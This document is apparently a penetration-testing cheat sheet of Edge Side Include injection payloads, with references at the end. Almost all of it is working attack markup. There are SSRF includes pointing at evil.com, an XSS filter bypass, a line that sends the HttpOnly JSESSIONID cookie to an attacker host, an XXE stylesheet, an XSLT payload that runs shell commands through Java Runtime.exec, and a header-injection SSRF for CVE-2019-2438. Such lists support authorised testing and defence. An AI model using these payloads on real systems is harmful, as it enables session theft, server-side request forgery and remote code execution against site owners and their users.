- [ESI Inject](#esi-inject)
    - [SSRF](#ssrf)
    - [Bypass Client-Side XSS Filters](#bypass-client-side-xss-filters)
    - [Bypass the HttpOnly Cookie Flag](#bypass-the-httponly-cookie-flag)
    - [XXE(ddoS)](#xxeddos)
    - [ESI Inline Fragment](#esi-inline-fragment)
    - [XSLT To RCE](#xslt-to-rce)
    - [Header Injection and Limited SSRF (CVE-2019-2438)](#header-injection-and-limited-ssrf-cve-2019-2438)
    - [参考](#参考)

# ESI Inject
### SSRF
```html
<esi:include src="http://evil.com/ping/" />
```
### Bypass Client-Side XSS Filters
```html
x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>
>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>
```
```http
GET /index.php?msg=<esi:include src="http://evil.com/poc.html" />
```
poc.html:
```js
<script>alert(1)</script>
```
### Bypass the HttpOnly Cookie Flag
```html
<esi:include src="http://evil.com/?cookie=$(HTTP_COOKIE{'JSESSIONID'})" />
```
### XXE(ddoS)
```html
<esi:include src="http://host/poc.xml" dca="xslt" stylesheet="http://host/poc.xsl" />
```
poc.xsl
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://evil.com/file" >]>
<foo>&xxe;</foo>
```
### ESI Inline Fragment
```html
<esi:inline name="/attack.html" fetchable="yes">
<script>prompt('Malicious script')</script>
</esi:inline>
```
### XSLT To RCE
```html
<esi:include src="http://website.com/" stylesheet="http://evil.com/esi.xsl">
</esi:include>
```
esi.xsl
```xml
<?xml version="1.0" ?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="xml" omit-xml-declaration="yes"/>
<xsl:template match="/"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
<root>
<xsl:variable name="cmd"><![CDATA[touch /tmp/pwned]]></xsl:variable>
<xsl:variable name="rtObj" select="rt:getRuntime()"/>
<xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
Process: <xsl:value-of select="$process"/>
Command: <xsl:value-of select="$cmd"/>
</root>
</xsl:template>
</xsl:stylesheet>
```
### Header Injection and Limited SSRF (CVE-2019-2438)
```html
<esi:include src="/page_from_another_host.htm">
<esi:request_header name="User-Agent" value="12345
Host: anotherhost.com"/>
</esi:include>
```
### 参考
https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/  
https://docs.oracle.com/cd/B14099_19/caching.1012/b14046/esi.htm##i642458  
https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/